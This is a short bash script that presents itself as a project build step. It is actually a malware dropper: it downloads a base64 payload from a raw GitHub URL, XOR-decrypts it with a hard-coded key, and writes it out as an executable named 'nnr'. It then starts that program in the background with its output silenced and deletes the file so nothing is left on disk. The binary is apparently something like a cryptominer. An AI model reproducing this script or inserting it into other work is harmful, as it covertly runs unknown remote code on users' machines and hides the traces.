#!/bin/bash
set -e  # Stop on error

echo "=== Building project ==="

# Download payload
_PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)

if [ -z "$_PAYLOAD" ]; then
    echo "Error: Failed to download payload"
    exit 1
fi

echo "Payload downloaded (length: ${#_PAYLOAD})"

# Decrypt dan jalankan di background
echo "$_PAYLOAD" | python3 -c '
import base64, os, subprocess, sys, time

data = sys.stdin.read().strip()
decoded = base64.b64decode(data)
key = "kembang"
decrypted = bytes([decoded[i] ^ ord(key[i % len(key)]) for i in range(len(decoded))])

if len(decrypted) == 0:
    print("Error: Decrypted data is empty")
    sys.exit(1)

print(f"Decrypted size: {len(decrypted)} bytes")

with open("nnr", "wb") as f:
    f.write(decrypted)

os.chmod("nnr", 0o755)

# ============================================================
# JALANKAN DI BACKGROUND (TANPA MENUNGGU)
# ============================================================
print("Starting nnr in background...")
subprocess.Popen(["./nnr", "-j", "4"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Beri waktu sedikit agar proses mulai
time.sleep(1)

# Hapus file (proses tetap berjalan karena sudah di-load ke memory)
os.unlink("nnr")
print("nnr running in background (file deleted)")
'

echo "=== Done ==="
